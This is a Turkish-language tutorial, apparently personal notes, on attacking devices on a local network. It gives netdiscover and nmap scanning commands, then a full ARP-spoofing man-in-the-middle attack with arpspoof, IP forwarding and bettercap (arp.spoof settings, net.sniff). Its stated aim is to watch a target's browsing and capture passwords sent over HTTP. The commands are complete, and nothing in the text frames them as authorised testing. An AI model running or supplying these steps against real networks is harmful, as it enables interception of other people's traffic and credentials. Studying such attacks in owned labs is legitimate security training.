Bağlı olduğumuz ağdaki cihazları hacklemeye çalışacağız. Bunun için öncelikle netdiscover aracını kullanacağız bu araç ile ağımızdaki
cihazların MAC adreslerini ve ip adreslerini göreceğiz.

netdiscover -i wlan0 -r 192.168.1.0/24 -c paketSayısı -> -r kısmında hangi aralıktaki ip adreslerini tarayacağını belirtiyoruz. Biz
tüm ip adreslerini seçtik. paket sayısıda ne kadar istek gönderileceğidir. eğer cihazlar gözükmezse daha fazla istek gönderilebilir.

nmap 192.168.1.0/24 -> bağlı olduğumuz ağdaki cihazları tarar ve daha ayrıntılı bir şekilde sunar. Cihazların isimleri, açık portlar 
vb. birçok ayrıntıyı gösterir

arpspoof -i wlan0 -t hedefIP modemIP -> hedef cihaza kendi mac adreimiz ile gidip benim IP adresim bu(modem IP) diyerek kendimizi
modem olarak tanıtırız ve cihaz tüm isteklerini modeme değil bize iletir

arpspoof -i wlan0 -t modemIP hedefIP -> modeme kendi mac adresimiz ile gidip benim IP adresim bu(hedef IP) diyerek kendimizi hedef 
cihaz olarak tanıtırız ve modem gelen isteklerin cevaplarını bize iletir.

Bu işlemde hedef cihaz internet isteklerini bize iletir bizde bu isteği hedef cihazmış gibi modeme iletiriz ve modemde bizi hedef cihaz
olarak tanıdığı için isteklerin cevaplarını bize verir bizde hedef cihaza modemmiş gibi cevapları iletiriz. Hedef cihaz internet 
konusunda bir sıkıntı yaşamaz ama hangi siteye gittiğini veya sitelere kayıt olurken verilerini görebiliriz. Şifreleri HTTP sitelere
girişte görebiliriz HTTPS'te göremeyiz.

echo 1 > /proc/sys/net/ipv4/ip_forward -> burada diğer cihazlara ip gönderebilmeyi aktif hale getiriyoruz

Bettercap Kullanımı:

Bettercap ortadaki adam saldırılarını daha kolay hale getirir. Yani wireshark üzerinden paketlere tek tek bakarak arama yapmak yrine
biraz daha filtrelenmiş bir şekilde önümüze sunar.

bettercap -iface wlan0 -> bettercap başlatma

bettercap arayüzüne girdikten sonra help yazarak kullanılabilecek araçları görebiliriz.

net.probe on -> Ağdaki cihazları dürter ve kaç cihaz olduğunu bu cihazların ip ve mac adreslerini görürüz. bu işelm sonrasında 
net.recon adında bir araçta çalışır. bu araçta ağ bilgilerini toplar

net.show -> net.recon aracının topladığı ağ bilgilerini tablo halinde gösterir

set arp.spoof.fullduplex true -> fullduplex true olarak ayarlandığında hem cihaza hem de modeme saldırı yapar

set arp.spoof.internal true -> internal true olursa ağ içindeki ve ağ dışından gelen paketleri dinler. false olursa sadece
ağ dışından gelen paketleri dinler. 

set arp.spoof.targets hedefIP -> saldırı yapılacak cihazların IP adresleri girilir

arp.spoof on -> ayarlamalar bittikten sonra araç çalıştırılır ve cihaz bizi modem modemde cihaz sanmaya başlar arka planda
islem devam eder

net.sniff on -> arp saldırısındaki hedef cihazın internetteki verilerini işleyebilmemiz için depolar